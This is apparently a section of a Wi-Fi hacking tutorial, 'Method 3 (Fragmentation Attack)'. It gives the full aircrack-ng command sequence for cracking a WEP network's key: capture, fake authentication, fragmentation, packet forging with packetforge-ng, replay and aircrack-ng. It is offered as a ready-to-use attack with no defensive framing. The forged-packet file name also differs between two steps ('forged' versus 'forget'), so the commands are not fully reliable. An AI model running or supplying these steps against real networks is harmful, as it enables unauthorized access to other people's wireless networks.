- - -
# Method 3 🎃 ( Fragmentation Attack ) : 

#### Run Airodump-ng On Target AP : 

```sh
airodump-ng --bssid AA:AA:AA:AA:AA:AA --channel 69 --write fragment-test mon0
```

#### Do a Fakeauth : 

```sh
aireplay-ng  --fakeauth 0 -a <Target-MAC> -h <Our-MAC> mon0
```

#### Perform a Fragment : 

```sh
aireplay-ng  --fragment -b <Target-MAC> -h <Our-MAC> mon0
>>> y
```

![Imgur](https://i.imgur.com/rqSGL4p.png)

####  Run packetforge-ng : 
Against created **.xor** file.

Perform a **fakeauth** again. Then; 

```sh
packetforge-ng -0 -a <Target-MAC> -h <Our-MAC> -k 255.255.255.255 -l 255.255.255.255  -y *.xor -w fragment-forged-packet
```

#### Run the Aireplay-ng : 

Perform a **fakeauth** again. Then; 

```sh
aireplay-ng -2 -r fragment-forget-packet mon0
>>> y
```

#### Now run aircrack-ng : 

```sh
aircrack-ng fragment-test-01.cap
```

![Imgur](https://i.imgur.com/IXC6YSy.png)

- - -
